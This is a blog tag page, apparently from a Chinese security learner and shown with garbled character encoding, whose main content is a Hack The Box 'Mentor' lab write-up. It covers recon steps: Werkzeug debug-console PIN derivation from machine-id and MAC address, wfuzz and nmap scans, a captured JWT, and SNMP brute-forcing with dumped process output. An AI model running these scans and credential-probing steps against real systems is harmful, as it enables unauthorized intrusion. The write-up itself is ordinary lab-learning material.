
<!DOCTYPE html>
<html>
  <head>
    
<meta charset="utf-8" >

<title>åˆ·é¢˜ | æŒå‰‘</title>
<meta name="description" content="ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ ">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>



  </head>
  <body>
    <div id="app" class="main">
      <div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://1dayluo.github.io">
        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
      </a>
      <a href="https://1dayluo.github.io">
        <h1 class="site-title">æŒå‰‘</h1>
      </a>
    </div>
    <div class="right">
      <transition name="fade">
        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
      </transition>
    </div>
  </div>
</div>

<transition name="fade">
  <div class="menu-container" style="display: none;" v-show="menuVisible">
    <div class="menu-list">
      
        
          <a href="/" class="menu purple-link">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="menu purple-link">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="menu purple-link">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="menu purple-link">
            å…³äº
          </a>
        
      
    </div>
  </div>
</transition>


      <div class="content-container">

        <div class="current-tag-container">
          <h2 class="title">
            <i class="icon icon-pricetags-outline"></i> åˆ·é¢˜
          </h2> 
        </div>

        
<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/gogs-rce-li-shi-lou-dong-xue-xi-bi-ji/">
        <h2 class="post-title"> Gogs RCE å†å²æ¼æ´å­¦ä¹ ç¬”è®°</h2>
      </a>
      <div class="post-abstract">
        
      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-05-25</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
                å­¦ä¹ ç¬”è®°
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/7wis0OAqRY/">
                æ¼æ´åˆ†æ
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/ZYt2rq1nxl/">
                ç¬”è®°
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
                é¶åœº
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/length-extension-attack/">
        <h2 class="post-title">Length Extension Attack</h2>
      </a>
      <div class="post-abstract">
        
      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-05-23</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
                å­¦ä¹ ç¬”è®°
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/u1f0sIOFOk/">
                åŠ å¯†æ”»å‡»
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/htbencoding/">
        <h2 class="post-title"> HTBï¼šEncoding</h2>
      </a>
      <div class="post-abstract">
        
      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-04-23</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
                é¶åœº
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                HTB
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/htbmentor/">
        <h2 class="post-title">HTB:Mentor</h2>
      </a>
      <div class="post-abstract">
        <h1 id="htbmentor">HTBï¼šMentor</h1>
<h2 id="recon">RECON</h2>
<p>æ˜¯Flaskï¼ˆ <code>2.0.3</code>) çš„ç½‘ç«™ï¼Œ<strong>TCP</strong>ç«¯å£æ‰«æç»“æœå°±æ˜¯ï¼š <code>20</code>, <code>53</code> , <code>80</code> ï¼Œç„¶åè¯•ç€ç›®å½•éå†ï¼ˆä¸è¿‡æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„å­—å…¸æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„æ”¶è·ï¼‰å’Œå­åŸŸåï¼Œåœ¨è¿™ä¸ªåŒæ—¶æˆ‘ä¼šå»ç¿»çœ‹ç½‘é¡µæºä»£ç å’Œå…¶ä»–ä¿¡æ¯</p>
<p>åœ¨æœæŸ¥çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº†ä½¿ç”¨åˆ°äº† <code>Werkzeug</code> ï¼Œå…³äºå®ƒçš„ä»‹ç»å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>åœ¨Python Webå¼€å‘ä¸­ï¼ŒWerkzeugé€šå¸¸ä¸å…¶ä»–æ¡†æ¶ï¼ˆå¦‚Flaskã€Djangoç­‰ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œä½œä¸ºè¿™äº›æ¡†æ¶çš„åº•å±‚åº“ã€‚ä½¿ç”¨Werkzeugï¼Œå¼€å‘äººå‘˜å¯ä»¥æ›´è½»æ¾åœ°å¤„ç†HTTPè¯·æ±‚å’Œå“åº”ï¼Œå®ç°ä¸­é—´ä»¶ï¼ˆmiddlewareï¼‰å’Œæ‹¦æˆªå™¨ï¼ˆinterceptorï¼‰ç­‰åŠŸèƒ½ï¼Œä»¥åŠè¿›è¡Œè°ƒè¯•å’Œæµ‹è¯•ã€‚</p>
<p>æ€»ä¹‹ï¼Œå¦‚æœä½ åœ¨Python Webå¼€å‘ä¸­éœ€è¦å¤„ç†HTTPè¯·æ±‚å’Œå“åº”ã€å®ç°ä¸­é—´ä»¶æˆ–è¿›è¡Œè°ƒè¯•å’Œæµ‹è¯•ç­‰ä»»åŠ¡ï¼Œé‚£ä¹ˆWerkzeugå¯èƒ½ä¼šæ˜¯ä¸€ä¸ªæœ‰ç”¨çš„æŠ€æœ¯æ ˆ</p>
</blockquote>
<p>åœ¨è‘—åçš„<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">hackertricks</a>ä¸‹å»æŸ¥çœ‹ä¸€äº›é’ˆå¯¹ <code>Werkzeug</code> çš„æ”»å‡»æ‰‹æ®µï¼Œè¿™é‡Œå‘ç°åŸå§‹ç½‘é¡µå¯¹ <code>/consoel</code> æ˜¯ç¦æ­¢è®¿é—®çš„ï¼Œæ‰€ä»¥éœ€è¦å»æƒ³åŠæ³•æŸ¥çœ‹PIN number</p>
<p>åŸç†è®²è§£ï¼š<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</a></p>
<p>PINçš„ç”Ÿæˆä¸»è¦åœ¨ä»¥ä¸‹çš„ä¸¤ä¸ªlistå˜é‡ä¸­</p>
<pre><code class="language-python">probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
# getattr(app, '__name__', getattr (app .__ class__, '__name__')) is Flask 
# getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory
# uuid.getnode() is the MAC address of the current computer, str (uuid.getnode ()) is the decimal expression of the mac address
# get_machine_id() read the value in /etc/machine-id or /proc/sys/kernel/random/boot_i and return directly if there is
</code></pre>
<p>å…¶ä¸­ macåœ°å€åœ¨ <code>/proc/net/arp</code> ï¼ˆæŒ‡çš„æ˜¯Linuxï¼‰</p>
<p>ç„¶åæŒ–æ˜äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸æ˜¯è¿™é‡Œçš„é—®é¢˜ ğŸ¥²  æˆ‘å‘ç°æˆ‘è€æ˜¯æŠŠç®€å•çš„é—®é¢˜æƒ³å¤æ‚â€¦â€¦å•Šå•Šå•Šå•Šå•Šå•Šï¼ˆèœç‹—ç—›è‹¦.jpg)ã€‚ç„¶åç›´çº¿è·ç¦»ä¼šç»•ä¸ªå¼¯èµ°ã€‚ä½†æ˜¯ç­‰å¾…æ‰«æç»“æœçš„è¿‡ç¨‹çœŸçš„å¥½ç—›è‹¦ï¼ˆèœç‹—ç—›è‹¦Ã—2.jpg)â€¦â€¦</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/20230315.png" alt="Untitled" loading="lazy"></figure>
<p>åå¤æµ‹è¯•ï¼Œæœ€åå­åŸŸåå‘ç°äº†ï¼ˆç«Ÿç„¶æ˜¯404ï¼‰</p>
<ul>
<li>api.mentorquotes.htb</li>
</ul>
<p>åŒç†ï¼ŒåŠ å…¥åˆ° <code>/etc/hosts</code> é‡Œã€‚</p>
<h2 id="å­åŸŸåæ‰«æ">å­åŸŸåæ‰«æ</h2>
<p>è™½ç„¶æˆ‘æ¯ä¸ªå·¥å…·çš„å‘½ä»¤éƒ½æ˜¯å•ç‹¬æ€»ç»“çš„ï¼Œä½†æ˜¯å¶å°”è´´ä¸€ä¸‹å§</p>
<pre><code class="language-python">wfuzz -c -w &lt;dict&gt; -u &quot;http://api.mentorquotes.htb/FUZZ&quot; --hc 404
</code></pre>
<p>ç»“æœ</p>
<pre><code class="language-python">=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                       
=====================================================================
000000004:   307        0 L      0 W        0 Ch        &quot;admin&quot;                                                                                                                                                                                       
000000124:   200        30 L     62 W       969 Ch      &quot;docs&quot;                                                                                                                                                                                        
000000205:   307        0 L      0 W        0 Ch        &quot;users&quot;
000001440:   307        0 L      0 W        0 Ch        &quot;quotes&quot;
000004658:   403        9 L      28 W       285 Ch      &quot;server-status&quot;

</code></pre>
<h2 id="docs-æ¢ç´¢">/docs æ¢ç´¢</h2>
<h3 id="auth">Auth</h3>
<p>ä»¥å‰ä¹Ÿåˆ·è¿‡å…³äºapiçš„boxï¼š<a href="https://1dayluo.github.io/post/htbbackend-api/">https://1dayluo.github.io/post/htbbackend-api/</a>   ï¼ˆè¿™ä¸ªè¿˜çœŸçš„ä¸é”™ï¼Œå½“æ—¶åˆ·è¿‡ä¸€æ¬¡å°±è§‰å¾—å­¦åˆ°äº†å¾ˆå¤šï¼‰</p>
<p>æ³¨å†Œ</p>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303151.png" alt="Untitled" loading="lazy"></figure>
<p>ç™»å½•</p>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303152.png" alt="Untitled" loading="lazy"></figure>
<p>è¿”å›çš„å†…å®¹æ˜¯ï¼š</p>
<pre><code class="language-python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0
</code></pre>
<h3 id="users">Users</h3>
<p>ç›´æ¥ç”¨docsä¸‹çš„å‘èµ·æ˜¯å¤±è´¥çš„</p>
<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303153.png" alt="Untitled" loading="lazy"></figure>
<p>ç„¶åæˆ‘æ³¨æ„åˆ°äº†</p>
<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303154.png" alt="Untitled" loading="lazy"></figure>
<p>æŠŠåˆšåˆšloginçš„å†…å®¹ä½œä¸ºjwtä¼ å…¥åˆ°headeré‡Œ</p>
<pre><code class="language-lua">GET /users/ HTTP/1.1
Host: api.mentorquotes.htb
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
DNT: 1
Referer: http://api.mentorquotes.htb/docs
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-gpc: 1
Connection: close
</code></pre>
<p>è¿”å›ï¼š</p>
<pre><code class="language-lua">{&quot;detail&quot;:&quot;Only admin users can access this resource&quot;}
</code></pre>
<p>åŒ…æ‹¬ <code>/users/{id}</code> ä¹Ÿæ˜¯ä¸€æ ·ï¼Œè™½ç„¶æœ‰è·³è½¬ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯æç¤ºåªæœ‰ç®¡ç†å‘˜ç”¨æˆ·å¯ä»¥ä½¿ç”¨ã€‚çœ‹èµ·æ¥åº”è¯¥ç”¨äº†è§„åˆ™åŒ¹é…ï¼Œåé¢çš„ <code>/users/add</code> åº”è¯¥ä¹Ÿæ˜¯åŒç†</p>
<h3 id="quotes">Quotes</h3>
<p>ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ã€‚</p>
<ol>
<li>quotes - GET</li>
</ol>
<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303155.png" alt="Untitled" loading="lazy"></figure>
<ol>
<li>quotes - POST ï¼š æç¤ºåªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥</li>
<li>quotes - PUT ï¼š æç¤ºåªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥</li>
<li>quotes - POST ï¼š æç¤ºåªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥</li>
<li>quotes - DELETE ï¼š æç¤ºåªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥</li>
</ol>
<h2 id="snmp-private">SNMP - private</h2>
<p>apiæ¢ç´¢äº†å¥½ä¸€é˜µï¼Œçœ‹å“ªé‡Œèƒ½è·å–ç®¡ç†å‘˜authï¼Œä½†æ˜¯æ— æœã€‚ç„¶ååˆå›å½’åˆ°äº†å¤§ä½¬0xdfçš„åšå®¢ï¼ˆè°¢è°¢å¤§ä½¬TUTï¼‰</p>
<p>æˆ‘å¿½è§†äº†UDP portâ€¦â€¦</p>
<pre><code class="language-bash">sudo nmap -p- -sU --min-rate 10000 -oA /tmp/nmap-udp 10.10.11.193

# æ‰«æç»“æœï¼š
# PORT    STATE SERVICE
# 161/udp open  snmp
</code></pre>
<p>é—®chatGPTå’ŒnewBingå…³äºSNMPæ˜¯å¹²å˜›çš„å›ç­”</p>
<blockquote>
<p>chatGPT:<br>
ä¸€ä¸ªç½‘ç«™å¯èƒ½éœ€è¦ä½¿ç”¨SNMPæ¥ç›‘æ§ç½‘ç»œè®¾å¤‡çš„çŠ¶æ€å’Œæ€§èƒ½ï¼Œä»¥ç¡®ä¿ç½‘ç»œè®¾å¤‡æ­£å¸¸è¿è¡Œã€‚ä¾‹å¦‚ï¼Œå¦‚æœç½‘ç«™ä¾èµ–äºè´Ÿè½½å‡è¡¡å™¨ã€è·¯ç”±å™¨ã€äº¤æ¢æœºç­‰ç½‘ç»œè®¾å¤‡ï¼Œç›‘æ§è¿™äº›è®¾å¤‡çš„çŠ¶æ€å’Œæ€§èƒ½å¯ä»¥å¸®åŠ©ç®¡ç†å‘˜åŠæ—¶å‘ç°å’Œè§£å†³ç½‘ç»œé—®é¢˜ï¼Œæé«˜ç½‘ç»œçš„å¯ç”¨æ€§å’Œå¯é æ€§ã€‚æ­¤å¤–ï¼ŒSNMPè¿˜å¯ä»¥ç”¨äºæ”¶é›†ç½‘ç«™æœåŠ¡å™¨çš„æ€§èƒ½æŒ‡æ ‡ï¼Œå¦‚CPUåˆ©ç”¨ç‡ã€å†…å­˜ä½¿ç”¨ç‡ã€ç£ç›˜ç©ºé—´ç­‰ï¼Œä»¥å¸®åŠ©ç®¡ç†å‘˜ä¼˜åŒ–ç½‘ç«™æ€§èƒ½å’Œèµ„æºåˆ©ç”¨ç‡ã€‚</p>
</blockquote>
<p>Bing:</p>
<blockquote>
<p>æ‚¨å¥½ï¼Œè¿™æ˜¯Bingã€‚ğŸ˜Š</p>
<p>SNMPï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼‰æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œç”¨äºç®¡ç†å’Œç›‘è§†IPç½‘ç»œä¸­çš„ç½‘ç»œè®¾å¤‡ï¼Œå¦‚æœåŠ¡å™¨ï¼Œå·¥ä½œç«™ï¼Œè·¯ç”±å™¨ï¼Œäº¤æ¢æœºç­‰<a href="https://www.pconline.com.cn/win11/1511/15111684.html">1</a>ã€‚ä¸€ä¸ªç½‘ç«™å¯èƒ½éœ€è¦ç”¨åˆ°SNMPçš„æƒ…å†µæœ‰ï¼š</p>
<ul>
<li>ç½‘ç«™çš„ç®¡ç†å‘˜éœ€è¦ç›‘æ§å’Œé…ç½®ç½‘ç«™çš„æœåŠ¡å™¨æˆ–å…¶ä»–è®¾å¤‡<a href="https://resources.infosecinstitute.com/topic/snmp-pentesting/">2</a>ã€‚</li>
<li>ç½‘ç«™çš„å®‰å…¨æµ‹è¯•äººå‘˜éœ€è¦æ£€æµ‹ç½‘ç«™æ˜¯å¦å­˜åœ¨SNMPç›¸å…³çš„æ¼æ´<a href="https://blog.domotz.com/know-your-networks/snmp-port-number/">3</a>Â <a href="https://resources.infosecinstitute.com/topic/vulnerability-assessment-of-snmp-service-ii/">4</a>ã€‚</li>
<li>ç½‘ç«™çš„ç”¨æˆ·éœ€è¦é€šè¿‡SNMPè·å–ç½‘ç«™çš„æ€§èƒ½æˆ–çŠ¶æ€ä¿¡æ¯ã€‚</li>
</ul>
<p>æ‚¨æƒ³äº†è§£æ›´å¤šå…³äºSNMPçš„ä»€ä¹ˆå†…å®¹å‘¢ï¼Ÿ</p>
</blockquote>
<p>æ©â€¦â€¦è¿™æ³¢æ˜¯bingèµ¢äº†</p>
<p>snmpé™¤äº†ç”¨nmapå¤–ï¼Œè¿˜æœ‰ä»¥ä¸‹å·¥å…·ï¼š</p>
<ul>
<li>https://github.com/SECFORCE/SNMP-Brute.git</li>
<li>https://github.com/trailofbits/onesixtyone</li>
</ul>
<p>æˆ‘ç”¨äº†snmp-bruteã€‚é¦–å…ˆè¦æ ¹æ®READMEä¸‹è½½ä¸€äº›åŸºç¡€ä¾èµ–ã€‚ç„¶åæŒ‰ç…§å®˜æ–¹/helpæ¥çš„è¿è¡Œå°±å¥½ï¼Œ</p>
<p>å·¥å…·æ•è·åˆ°çš„æ•°æ® ï¼ˆå‘ç°ç®¡ç†å‘˜é‚®ç®±ï¼‰</p>
<pre><code class="language-bash">################## Enumerating SYSTEM Table using: iso.3.6.1.2.1.1  (SYSTEM Info)
	INFO
	----	
	STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
	OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
	Timeticks: (6160235) 17:06:42.35
	STRING: Me &lt;admin@mentorquotes.htb&gt;
	STRING: mentor
	STRING: Sitting on the Dock of the Bay
	INTEGER: 72

################## Enumerating Interfaces Table using: -Ci (Interface Info)
	Name   Mtu Network Address Ipkts Ierrs Opkts Oerrs Queue

################## Enumerating Routing Table using: -Cr (Route Info)

################## Enumerating Netstat Table using:  (Netstat)
	Active Internet (udp) Connections
	Proto Local Address               Remote Address                PID
	udp4  *.*                         *.*                             0
</code></pre>
<p>è¿™é‡Œä¸å¤ªä¼šï¼Œå°±è·Ÿç€ä½¬ä»¬çš„writeupæ¥å­¦ä¹ äº†ï¼Œ</p>
<p>ç„¶åæˆ‘ç”¨äº† <code>snmpbulkwalk</code> å·¥å…·</p>
<pre><code class="language-bash">HOST-RESOURCES-MIB::hrSWRunPath.921 = STRING: &quot;/usr/libexec/udisks2/udisksd&quot;
HOST-RESOURCES-MIB::hrSWRunPath.927 = STRING: &quot;/usr/sbin/ModemManager&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1200 = STRING: &quot;/usr/sbin/cron&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1208 = STRING: &quot;/usr/sbin/snmpd&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1221 = STRING: &quot;/usr/bin/containerd&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1242 = STRING: &quot;/sbin/agetty&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1243 = STRING: &quot;sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1254 = STRING: &quot;/usr/sbin/apache2&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1340 = STRING: &quot;/usr/bin/dockerd&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1691 = STRING: &quot;/bin/bash&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1742 = STRING: &quot;/usr/bin/docker-proxy&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1755 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1781 = STRING: &quot;postgres&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1838 = STRING: &quot;postgres: checkpointer &quot;
HOST-RESOURCES-MIB::hrSWRunPath.1839 = STRING: &quot;postgres: background writer &quot;
HOST-RESOURCES-MIB::hrSWRunPath.1840 = STRING: &quot;postgres: walwriter &quot;
HOST-RESOURCES-MIB::hrSWRunPath.1841 = STRING: &quot;postgres: autovacuum launcher &quot;
HOST-RESOURCES-MIB::hrSWRunPath.1842 = STRING: &quot;postgres: stats collector &quot;
HOST-RESOURCES-MIB::hrSWRunPath.1843 = STRING: &quot;postgres: logical replication launcher &quot;
HOST-RESOURCES-MIB::hrSWRunPath.1849 = STRING: &quot;/usr/bin/docker-proxy&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1863 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1889 = STRING: &quot;python3&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1958 = STRING: &quot;/usr/bin/docker-proxy&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1971 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;
HOST-RESOURCES-MIB::hrSWRunPath.1993 = STRING: &quot;python&quot;
HOST-RESOURCES-MIB::hrSWRunPath.2007 = STRING: &quot;/usr/local/bin/python3&quot;
HOST-RESOURCES-MIB::hrSWRunPath.2008 = STRING: &quot;/usr/local/bin/python3&quot;
HOST-RESOURCES-MIB::hrSWRunPath.2092 = STRING: &quot;postgres: postgres mentorquotes_db 172.22.0.1(46844) idle&quot;
HOST-RESOURCES-MIB::hrSWRunPath.2110 = STRING: &quot;/usr/bin/python3&quot;
HOST-RESOURCES-MIB::hrSWRunPath.26610 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunPath.26614 = STRING: &quot;postgres: postgres mentorquotes_db 172.22.0.1(60892) idle&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91129 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91137 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91143 = STRING: &quot;sh&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91144 = STRING: &quot;/bin/sh&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91148 = STRING: &quot;python3&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91149 = STRING: &quot;/bin/sh&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91419 = STRING: &quot;/usr/libexec/upowerd&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91862 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91958 = STRING: &quot;/usr/sbin/apache2&quot;
HOST-RESOURCES-MIB::hrSWRunPath.91959 = STRING: &quot;/usr/sbin/apache2&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.556 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.557 = STRING: &quot;-d -s&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.561 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.581 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.684 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.685 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.715 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.717 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.737 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.738 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.758 = STRING: &quot;-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.907 = STRING: &quot;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.912 = STRING: &quot;--foreground&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.913 = STRING: &quot;/usr/bin/networkd-dispatcher --run-startup-triggers&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.914 = STRING: &quot;--no-debug&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.915 = STRING: &quot;-n -iNONE&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.927 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1200 = STRING: &quot;-f -P&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1208 = STRING: &quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1221 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1242 = STRING: &quot;-o -p -- \\u --noclear tty1 linux&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1243 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1254 = STRING: &quot;-k start&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1340 = STRING: &quot;-H fd:// --containerd=/run/containerd/containerd.sock&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1691 = STRING: &quot;/usr/local/bin/login.sh&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1742 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1755 = STRING: &quot;-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1781 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1838 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1839 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1840 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1841 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1842 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1843 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1849 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1863 = STRING: &quot;-namespace moby -id 556e8c834293dd86447407ed131913827ab286e6c16eb2629ef5567c3beec9ba -address /run/containerd/containerd.sock&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1889 = STRING: &quot;-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1958 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80&quot;
